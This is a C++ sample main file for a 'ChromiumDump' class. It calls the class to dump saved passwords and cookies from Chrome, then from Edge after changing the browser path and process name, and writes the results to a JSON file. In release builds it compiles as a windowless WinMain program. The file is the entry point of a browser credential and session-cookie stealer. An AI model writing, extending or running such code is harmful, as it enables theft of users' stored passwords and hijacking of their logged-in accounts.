#pragma once
#include "ChromiumDump.h"
/*
	Sample Main to demonstrate how to use the ChromiumDump class to dump password and cookie data of Chrome and Edge
*/
#ifdef _DEBUG
int main() {
#else
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
#endif
	ChromiumDump chrome = ChromiumDump::ChromiumDump();
	chrome.DumpPasswordData();
	chrome.DumpCookieData();

	ChromiumDump edge = chrome;
	edge.setBrowserDataPath(L"Microsoft\\Edge\\User Data");
	edge.setBrowserName(L"msedge.exe");
	edge.DumpPasswordData();
	edge.DumpCookieData();

//#ifdef _DEBUG
	edge.WriteJSON(L"out.json");
//#else 
	json j = edge.getJSONData();
//#endif
	return 0;
}